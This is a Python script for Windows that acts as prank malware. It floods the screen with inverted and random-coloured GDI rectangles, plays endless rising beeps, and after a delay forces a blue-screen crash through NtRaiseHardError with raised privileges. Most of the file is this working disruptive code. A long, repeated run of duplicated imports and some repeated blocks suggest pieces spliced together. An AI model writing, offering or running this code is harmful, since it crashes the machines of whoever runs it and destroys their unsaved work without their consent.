import ctypes
import time
import random
import win32api
import win32con
import win32gui
import win32ui
import win32com.client
import pythoncom
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import win32gui
import win32api
import win32con
import random
import time
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import win32gui
import win32api
import win32con
import random
import time
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
import os    
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
import win32api
from win32file import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import winsound
import ctypes
import threading
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
import subprocess
from win32gui import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
from win32gui import *
import win32api
from win32file import *
from win32api import *
from win32ui import *
from win32con import *
from random import *
import winsound
import ctypes
import threading
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import os
import subprocess
from PIL import ImageGrab
desk = GetDC(0)
x = 100
y = 100
x_2 = 100
y_2 = 100


for i in range(5):
    PatBlt(desk, x, y, x_2, y_2, PATINVERT)
    x += 10
    y += 10
    x_2 -= 10
    y_2 -= 10
    
# Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    brush = CreateSolidBrush(RGB(
        0, # Red value
        0, # Green value
        200 # Blue value
    )) # Creates a brush
    SelectObject(desk, brush) # Choose that we're drawing with our brush.
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
    DeleteObject(brush) # Frees up memory. Pretty necessary to avoid crashes etc.
    Sleep(10) # Waits 10 milliseconds
    # Importing some Windows libraries. To use them type pip install pywin32 in console.
desk = GetDC(0) # Get the first monitor and store it in our desk variable
x = GetSystemMetrics(0) # Get screen width and store it in x
y = GetSystemMetrics(1) # Get screen height and store it in y
# Let's try changing its color! We can do that using SelectObject and CreateSolidBrush!
for i in range(0, 100):
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT) # Makes a lot of stuff :)
    Sleep(10) # Waits 10 milliseconds
    # Library Import


desk = GetDC(0) # Get Primary Monitor
x = GetSystemMetrics(0) # Get monitor width
y = GetSystemMetrics(1) # Get monitor height
freq = 1000 # initial frequency in hertz


def tone(): # Defines the function "tone" which is responsible for the audio effects
    while True:
        global freq
        winsound.Beep(freq, 10000)
        freq = freq + 50
        if freq > 30000:
            freq = 1000
    
def shut(): # Defines the function "shut" which is responsible for the BSOD Triggering
    for n in range(0, 1):
        Sleep(20000)
        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint())
        )
        

def gdi(): # Defines the function "gdi" wich is responsible for the gdi effects
    while True:
        brush =  CreateSolidBrush(RGB(

            randrange(255),
            randrange(255),
            randrange(255),

        ))
        SelectObject(desk, brush)
        PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATINVERT)
        DeleteObject(brush)
        Sleep(5)
    ReleaseDC(desk, GetDesktopWindow())
    DeleteDC(desk)

p1 = threading.Thread(target=tone) # Placing the function "tone" in multitasking
p2 = threading.Thread(target=gdi) # Placing the function "gdi" in multitasking
p1.start() # Run the Function "tone"
p2.start() # Run the Function "gdi"


shut() # Triggers BSOD After 30 seconds

exit() # End the script execution
